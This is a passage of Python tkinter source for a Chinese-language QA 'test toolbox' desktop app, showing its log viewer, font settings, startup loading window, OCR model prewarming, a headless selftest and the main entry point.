            "  2. 图片批量转 ZIP - 每张图片单独转PDF并打包为ZIP\n"
            "  3. 文件分割 - 按大小分割为多个ZIP\n"
            "  4. 文件合并 - 还原分割的ZIP文件\n"
            "  5. 生成指定大小文件 - 生成任意大小和格式的文件\n"
            "  6. 生成指定长度文本 - 生成指定长度类型的随机文本\n"
            "  7. 随机人员信息 - 生成随机身份证号、姓名、手机号等\n"
            "  8. URL编码解码 - 文本的URL百分号编码与解码\n"
            "  9. 接口请求 - 发送GET/POST请求查看响应\n"
            "  10. JSON格式化 - JSON美化/压缩为字符串\n"
            "  11. JSON对比 - 排序后逐字符对比，标注差异\n"
            "  12. 截图识别表格 - 截图识别表格并导出到Excel\n\n"
            "使用方法:\n"
            "  左侧选择功能，右侧填写参数后点击开始按钮。\n"
        )
        lbl = tk.Label(self.content, text=info, bg="#f5f6fa", fg="#2c3e50",
                       font=("Microsoft YaHei UI", 11), justify="left", anchor="w")
        lbl.pack(anchor="nw", pady=(10, 0))

        # ---- 后台日志查看（开发调试用）----
        bar = tk.Frame(self.content, bg="#f5f6fa")
        bar.pack(fill="x", pady=(8, 2))
        tk.Label(bar, text="日志级别:", bg="#f5f6fa",
                 font=("Microsoft YaHei UI", 10)).pack(side="left")
        def _refresh_dev_log(_e=None):
            self._dev_log_level = self._dev_log_level_var.get()
            order = {lv: i for i, lv in enumerate(self._DEV_LOG_LEVELS)}
            min_idx = order.get(self._dev_log_level, 1)
            self._dev_log_text.config(state="normal")
            self._dev_log_text.delete("1.0", "end")
            for ts, lv, msg in self._dev_log_records:
                if order.get(lv, 1) >= min_idx:
                    self._dev_log_text.insert("end", f"[{ts}] [{lv}] {msg}\n")
            self._dev_log_text.see("end")
            self._dev_log_text.config(state="disabled")

        self._dev_log_level_var = tk.StringVar(value=self._dev_log_level)
        self._dev_log_level_combo = ttk.Combobox(bar, textvariable=self._dev_log_level_var, state="readonly",
                     values=self._DEV_LOG_LEVELS, width=8)
        self._dev_log_level_combo.pack(side="left", padx=(4, 10))
        self._dev_log_level_combo.bind("<<ComboboxSelected>>", _refresh_dev_log)


        self._refresh_dev_log = _refresh_dev_log
        tk.Button(bar, text="刷新", command=_refresh_dev_log, width=8).pack(side="left")

        def _clear_dev_log():
            self._dev_log_records.clear()
            _refresh_dev_log()

        tk.Button(bar, text="清空", command=_clear_dev_log, width=8).pack(side="left", padx=(6, 0))

        def _export_dev_log():
            from tkinter import filedialog
            p = filedialog.asksaveasfilename(defaultextension=".log",
                                             initialfile="dev_log.log",
                                             filetypes=[("日志文件", "*.log"), ("所有文件", "*.*")])
            if p:
                with open(p, "w", encoding="utf-8") as f:
                    for ts, lv, msg in self._dev_log_records:
                        f.write(f"[{ts}] [{lv}] {msg}\n")
                self._notify(f"后台日志已导出: {p}")

        tk.Button(bar, text="导出", command=_export_dev_log, width=8).pack(side="left", padx=(6, 0))

        self._dev_log_text = tk.Text(self.content, height=14, font=("Consolas", 9),
                                     wrap="word", bg="white")
        self._dev_log_text.pack(fill="both", expand=True, pady=(2, 0))
        _refresh_dev_log()

    # ---------------- 退出 ----------------
    def _setup_menu_bar(self):
        import tkinter.font as tkfont
        self._menubar = tk.Menu(self)
        settings_menu = tk.Menu(self._menubar, tearoff=0)
        settings_menu.add_command(label="字体大小", command=self._change_font_size)
        self._menubar.add_cascade(label="设置", menu=settings_menu)
        self.config(menu=self._menubar)

    def _change_font_size(self):
        dialog = tk.Toplevel(self)
        dialog.title("字体大小")
        dialog.transient(self)
        dialog.grab_set()
        tk.Label(dialog, text="选择字体大小:").pack(padx=10, pady=(8, 2))
        var = tk.IntVar(value=self._font_size_var.get())
        for size in [8, 10, 12, 14, 16, 18]:
            tk.Radiobutton(dialog, text=str(size), variable=var, value=size).pack(anchor="w", padx=10)
        def _apply():
            self._font_size_var.set(var.get())
            self._apply_font_size(var.get())
            dialog.destroy()
        tk.Button(dialog, text="确定", command=_apply).pack(pady=(2, 8))
        dialog.update_idletasks()
        dialog.geometry(f"+{self.winfo_rootx()+self.winfo_width()//2-60}+{self.winfo_rooty()+self.winfo_height()//2-80}")

    def _apply_font_size(self, size):
        import tkinter.font as tkfont
        for name in ("TkDefaultFont", "TkTextFont", "TkFixedFont", "TkMenuFont", "TkButtonFont", "TkCaptionFont", "TkHeadingFont"):
            try:
                tkfont.nametofont(name).configure(size=size)
            except tkfont.FontNotFound:
                pass

    def _on_close(self):
        if self._running:
            if not messagebox.askyesno("退出", "有任务正在运行，确定退出吗？"):
                return
        # 停止快捷键监听
        if self._ocr_listener:
            try:
                self._ocr_listener.stop()
            except:
                pass
        self.destroy()


def _prewarm_model_worker(app):
    _load_heavy_modules()
    """后台预热：程序启动后立即加载表格识别模型。
    mobile 模型加载仅需数秒；server 模型较慢（exe 下约1-3分钟）。
    预热后用户截图识别可立即返回，避免识别期间长时间等待被误认为无响应。"""
    import time

    def notify(text):
        try:
            app.after(0, lambda t=text: app._notify_global(t))
        except Exception:
            pass

    time.sleep(8)  # 避开启动高峰（onefile 解压、GUI 初始化、更新检查）
    notify(f"正在后台加载表格识别模型（{_OCR_MODEL_CHOICE}），期间可正常使用其他功能...")
    try:
        # 注意：这里不能用 redirect_stdout 吞 paddlex 的加载输出——
        # redirect_stdout 是进程级全局替换，会把并发识别任务的日志一起吞掉
        #（识别 worker 的 print 全部丢失，日志面板空白）。
        # paddlex 加载 print 在 exe（无控制台）中自然丢弃，源码运行进控制台，均无害。
        _get_table_pipeline()
        notify("表格识别模型已就绪，截图识别可立即使用")
    except Exception:
        logging.error(f"[模型预热] 加载失败:\n{traceback.format_exc()}")
        notify("模型后台加载失败，将在首次识别时重试（详见 update.log）")


def _run_selftest():
    _load_heavy_modules()
    """无 GUI 自检入口（TestToolbox.exe --selftest）：生成表格图并完整跑一次识别，
    结果写入 exe 同级 _selftest_result.txt，用于验证打包后识别功能真实可用。"""
    import time
    global _OCR_MODEL_CHOICE

    # 自检环境不保证可选模型已下载：缺失时回退到内置默认模型
    opt = _OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]
    if any(_ocr_model_dir(opt[k]) is None for k in ("det", "rec")):
        _OCR_MODEL_CHOICE = _OCR_MODEL_DEFAULT

    out = os.path.join(_APP_DIR, "_selftest_result.txt")
    with open(out, "w", encoding="utf-8") as f:
        f.write(f"selftest start: models_dir={_MODELS_DIR}\n")
        try:
            from PIL import Image, ImageDraw, ImageFont
            img = Image.new("RGB", (640, 320), "white")
            d = ImageDraw.Draw(img)
            try:
                font = ImageFont.truetype("C:/Windows/Fonts/arial.ttf", 22)
                hfont = ImageFont.truetype("C:/Windows/Fonts/msyh.ttc", 22)
            except Exception:
                font = hfont = ImageFont.load_default()
            rows = [["Name", "Age", "City"],
                    ["Alice", "30", "Beijing"],
                    ["Bob", "25", "Shanghai"],
                    ["Carol", "35", "Guangzhou"]]
            x0, y0, cw, rh = 40, 40, 180, 60
            for r, row in enumerate(rows):
                for c, cell in enumerate(row):
                    d.text((x0 + c * cw + 10, y0 + r * rh + 15), cell, fill="black",
                           font=hfont if r == 0 else font)
            w, h = x0 + 3 * cw, y0 + 4 * rh
            for i in range(5):
                d.line([(x0 + i * cw, y0), (x0 + i * cw, h)], fill="black", width=2)
                d.line([(x0, y0 + i * rh), (w, y0 + i * rh)], fill="black", width=2)

            t0 = time.time()
            data, html = recognize_table(img)
            dt = time.time() - t0
            f.write(f"OK rows={len(data)} time={dt:.1f}s\n")
            for row in data:
                f.write(" | ".join(str(c) for c in row) + "\n")
            logging.info(f"[selftest] OK rows={len(data)} time={dt:.1f}s")
        except Exception:
            f.write("FAIL\n" + traceback.format_exc())
            logging.error(f"[selftest] FAIL\n{traceback.format_exc()}")


class _LoadingWindow:
    """启动加载窗：确定性进度条（挂钩真实构建阶段）+ 平滑动画显示"""

    def __init__(self):
        self.win = None
        self._target = 0.0   # 真实目标进度（由各构建阶段推进，只前进不回退）
        self._shown = 0.0    # 动画当前显示值
        self._after_id = None
        try:
            win = tk.Tk()
            win.title("启动中")
            win.overrideredirect(True)
            win.attributes("-topmost", True)  # 仅弹出瞬间置顶，随后自动取消，切换应用不挡屏
            win.configure(bg="white", padx=24, pady=18)
            w, h = 300, 132
            sw, sh = win.winfo_screenwidth(), win.winfo_screenheight()
            win.geometry(f"{w}x{h}+{(sw - w) // 2}+{(sh - h) // 2}")
            tk.Label(win, text="测试工具箱 v1.0.0", bg="white", fg="#2c3e50",
                     font=("Microsoft YaHei UI", 12, "bold")).pack()
            self._status = tk.Label(win, text="正在初始化...", bg="white", fg="#7f8c8d",
                                    font=("Microsoft YaHei UI", 9))
            self._status.pack(pady=(2, 8))
            self._bar_var = tk.DoubleVar(value=0.0)
            ttk.Progressbar(win, mode="determinate", maximum=100, length=240,
                            variable=self._bar_var).pack()
            win.update()
            self.win = win
            self._after_id = win.after(30, self._tick)
            win.after(1000, lambda: self.win is not None and self.win.attributes("-topmost", False))
        except Exception:
            self.win = None

    def _tick(self):
        """动画循环：显示值平滑逼近真实目标进度"""
        if self.win is None:
            return
        try:
            self._shown += (self._target - self._shown) * 0.18
            if self._target >= 100 and self._target - self._shown < 0.5:
                self._shown = self._target
            self._bar_var.set(self._shown)
            self._after_id = self.win.after(30, self._tick)
        except tk.TclError:
            self._after_id = None

    def update_progress(self, pct, text=""):
        """由构建阶段调用：推进真实进度"""
        if self.win is None:
            return
        try:
            self._target = max(self._target, min(float(pct), 100.0))
            if text:
                self._status.config(text=text)
            self.win.update_idletasks()
        except tk.TclError:
            pass

    def destroy(self):
        if self._after_id is not None and self.win is not None:
            try:
                self.win.after_cancel(self._after_id)
            except Exception:
                pass
        if self.win is not None:
            try:
                self.win.destroy()
            except Exception:
                pass
            self.win = None


# 当前启动加载窗实例（main 中赋值，构建阶段通过 _boot_progress 上报进度）
_BOOT_LOADER = None


def _boot_progress(pct, text=""):
    """上报启动进度到加载窗；加载窗不存在时静默忽略"""
    if _BOOT_LOADER is not None:
        _BOOT_LOADER.update_progress(pct, text)


def _create_loading_window():
    """动态加载窗口：主窗口就绪后由 _close_loading_window 销毁"""
    try:
        return _LoadingWindow()
    except Exception:
        return None


def _close_loading_window(win):
    """安全销毁加载窗口"""
    global _BOOT_LOADER
    _BOOT_LOADER = None
    if win is None:
        return
    try:
        win.destroy()
    except Exception:
        pass
def _close_boot_splash():
    """兼容：若存在 PyInstaller 静态启动画面则立即关闭（--splash 打包时生效）"""
    try:
        import pyi_splash  # noqa: F401  打包含 --splash 时才存在
        pyi_splash.close()
    except Exception:
        pass


def main():
    # 先显示 Tk 加载窗口，再关闭 PyInstaller 启动画面，避免两者之间出现无窗口空窗
    global _BOOT_LOADER
    loading = _create_loading_window()
    _BOOT_LOADER = loading
    _boot_progress(5, "正在初始化...")
    _close_boot_splash()
    app = ToolboxApp()          # __init__ 内已将默认根切换为主窗口（内部上报 10~95）
    _boot_progress(100, "启动完成")
    _close_loading_window(loading)  # 此时销毁加载窗不影响任何已创建变量
    # 启动时后台检查模型更新（网络失败不影响使用，仅日志提示）
    _setup_update_file_log()

    def _run_update_check():
        try:
            _check_model_updates_worker(app)
        except Exception:
            logging.error(f"[模型更新] 检查线程异常终止:\n{traceback.format_exc()}")

    t = threading.Thread(target=_run_update_check, daemon=True)
    t.start()
    # 后台预热模型：用户截图时模型已加载，识别即时返回
    threading.Thread(target=_prewarm_model_worker, args=(app,), daemon=True).start()
    app.mainloop()


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        _setup_update_file_log()
        _run_selftest()
    else:
        main()